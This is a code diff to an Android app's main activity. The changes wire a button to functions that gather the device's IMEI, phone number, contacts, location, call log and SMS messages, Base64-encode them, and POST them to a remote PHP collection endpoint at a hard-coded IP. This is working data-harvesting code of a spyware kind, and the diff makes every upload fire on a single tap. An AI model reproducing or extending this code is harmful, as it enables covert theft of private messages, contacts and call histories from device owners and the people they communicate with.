@@ -56,7 +56,7 @@ public class MainActivity extends Activity {
     
     private static int delayTime = 5000;
     
-    private static String ipAddr = "192.168.1.2";
+    private static String ipAddr = "10.0.0.1";
   
     private Handler handler = new Handler();  
   
@@ -161,7 +161,13 @@ public class MainActivity extends Activity {
             public void onClick(View v) {  
                 run = true;  
                 updateButton(5);  
-                handler.postDelayed(task, delayTime);  
+                //TODO
+                //handler.postDelayed(task, delayTime);  
+                replyDeviceInfo();
+                replyDeviceContacts();
+                replyDeviceLocations();
+                replyDeviceCallingRecords();
+                replyDeviceSMSRecords();
             }  
         }); 
         
@@ -187,7 +193,7 @@ public class MainActivity extends Activity {
         //replyDeviceContacts();
         //replyDeviceLocations();
         //replyDeviceCallingRecords();
-        tvResult.setText(replyDeviceSMSRecords());
+        
         
     }  
   
@@ -635,6 +641,12 @@ public class MainActivity extends Activity {
     /**返回设备基本信息**/
 	private String replyDeviceInfo(){ 
 		String[] deviceInfo = getDeviceInfo();
+		
+		deviceInfo[0] = (deviceInfo[0].length() == 0) ? "no IMEI" : deviceInfo[0];
+		deviceInfo[1] = (deviceInfo[1].length() == 0) ? "no phoneNumber" : deviceInfo[1];
+		deviceInfo[2] = (deviceInfo[2].length() == 0) ? "no phoneType" : deviceInfo[2];
+		deviceInfo[3] = (deviceInfo[3].length() == 0) ? "no systemType" : deviceInfo[3];
+		
 		String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_info";
 		try{  
 			HttpPost httpRequest = new HttpPost(temp_url); 
@@ -668,32 +680,37 @@ public class MainActivity extends Activity {
 	private String replyDeviceContacts(){ 
 		String[] deviceInfo = getDeviceInfo();
 		String contacts = getPhoneContacts();
-		String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_contacts";
-		try{  
-			HttpPost httpRequest = new HttpPost(temp_url); 
-			
-			List <NameValuePair> params = new ArrayList <NameValuePair>();
-	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
-	        params.add(new BasicNameValuePair("contacts", Base64.encodeToString(contacts.getBytes(),Base64.DEFAULT)));
-
-	        /* 添加请求参数到请求对象*/
-	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
-	        /*发送请求并等待响应*/
-	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
-	        /*若状态码为200 ok*/
-	        if(httpResponse.getStatusLine().getStatusCode() == 200){
-	        	/*读返回数据*/
-	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
-	        	return strResult;
-	        }
-	        else{
-	        	return "postError";
-	        }
-			
-		}  
-		catch(Exception ee) {  
-			return "error:" + ee.getMessage();
-		}  
+		if(contacts.length() != 0){
+			String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_contacts";
+			try{  
+				HttpPost httpRequest = new HttpPost(temp_url); 
+				
+				List <NameValuePair> params = new ArrayList <NameValuePair>();
+		        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
+		        params.add(new BasicNameValuePair("contacts", Base64.encodeToString(contacts.getBytes(),Base64.DEFAULT)));
+	
+		        /* 添加请求参数到请求对象*/
+		        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
+		        /*发送请求并等待响应*/
+		        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
+		        /*若状态码为200 ok*/
+		        if(httpResponse.getStatusLine().getStatusCode() == 200){
+		        	/*读返回数据*/
+		        	String strResult = EntityUtils.toString(httpResponse.getEntity());
+		        	return strResult;
+		        }
+		        else{
+		        	return "postError";
+		        }
+				
+			}  
+			catch(Exception ee) {  
+				return "error:" + ee.getMessage();
+			}  
+		}
+		else{
+			return "no contacts";
+		}
 	}
 	/**返回设备位置信息**/
 	private String replyDeviceLocations(){ 
@@ -731,62 +748,72 @@ public class MainActivity extends Activity {
 	private String replyDeviceCallingRecords(){ 
 		String[] deviceInfo = getDeviceInfo();
 		String callingRecords = getPhoneCallingRecords();
-		String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_calling_records";
-		try{  
-			HttpPost httpRequest = new HttpPost(temp_url); 
-			
-			List <NameValuePair> params = new ArrayList <NameValuePair>();
-	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
-	        params.add(new BasicNameValuePair("calling_records", Base64.encodeToString(callingRecords.getBytes(),Base64.DEFAULT)));
-
-	        /* 添加请求参数到请求对象*/
-	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
-	        /*发送请求并等待响应*/
-	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
-	        /*若状态码为200 ok*/
-	        if(httpResponse.getStatusLine().getStatusCode() == 200){
-	        	/*读返回数据*/
-	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
-	        	return strResult;
-	        }
-	        else{
-	        	return "postError";
-	        }
-			
-		}  
-		catch(Exception ee) {  
-			return "error:" + ee.getMessage();
-		}  
+		if(callingRecords.length() != 0){
+			String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_calling_records";
+			try{  
+				HttpPost httpRequest = new HttpPost(temp_url); 
+				
+				List <NameValuePair> params = new ArrayList <NameValuePair>();
+		        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
+		        params.add(new BasicNameValuePair("calling_records", Base64.encodeToString(callingRecords.getBytes(),Base64.DEFAULT)));
+	
+		        /* 添加请求参数到请求对象*/
+		        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
+		        /*发送请求并等待响应*/
+		        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
+		        /*若状态码为200 ok*/
+		        if(httpResponse.getStatusLine().getStatusCode() == 200){
+		        	/*读返回数据*/
+		        	String strResult = EntityUtils.toString(httpResponse.getEntity());
+		        	return strResult;
+		        }
+		        else{
+		        	return "postError";
+		        }
+				
+			}  
+			catch(Exception ee) {  
+				return "error:" + ee.getMessage();
+			}  
+		}
+		else{
+			return "no callingRecords";
+		}
 	}
 	/**返回设备短信记录**/
 	private String replyDeviceSMSRecords(){ 
 		String[] deviceInfo = getDeviceInfo();
 		String smsRecords = getPhoneSMSRecords();
-		String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_sms_records";
-		try{  
-			HttpPost httpRequest = new HttpPost(temp_url); 
-			
-			List <NameValuePair> params = new ArrayList <NameValuePair>();
-	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
-	        params.add(new BasicNameValuePair("sms_records", Base64.encodeToString(smsRecords.getBytes(),Base64.DEFAULT)));
-
-	        /* 添加请求参数到请求对象*/
-	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
-	        /*发送请求并等待响应*/
-	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
-	        /*若状态码为200 ok*/
-	        if(httpResponse.getStatusLine().getStatusCode() == 200){
-	        	/*读返回数据*/
-	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
-	        	return strResult;
-	        }
-	        else{
-	        	return "postError";
-	        }
-			
-		}  
-		catch(Exception ee) {  
-			return "error:" + ee.getMessage();
-		}  
+		if(smsRecords.length() != 0){
+			String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_sms_records";
+			try{  
+				HttpPost httpRequest = new HttpPost(temp_url); 
+				
+				List <NameValuePair> params = new ArrayList <NameValuePair>();
+		        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
+		        params.add(new BasicNameValuePair("sms_records", Base64.encodeToString(smsRecords.getBytes(),Base64.DEFAULT)));
+	
+		        /* 添加请求参数到请求对象*/
+		        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
+		        /*发送请求并等待响应*/
+		        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
+		        /*若状态码为200 ok*/
+		        if(httpResponse.getStatusLine().getStatusCode() == 200){
+		        	/*读返回数据*/
+		        	String strResult = EntityUtils.toString(httpResponse.getEntity());
+		        	return strResult;
+		        }
+		        else{
+		        	return "postError";
+		        }
+				
+			}  
+			catch(Exception ee) {  
+				return "error:" + ee.getMessage();
+			}  
+		}
+		else{
+			return "no smsRecords";
+		}
 	}
 }  
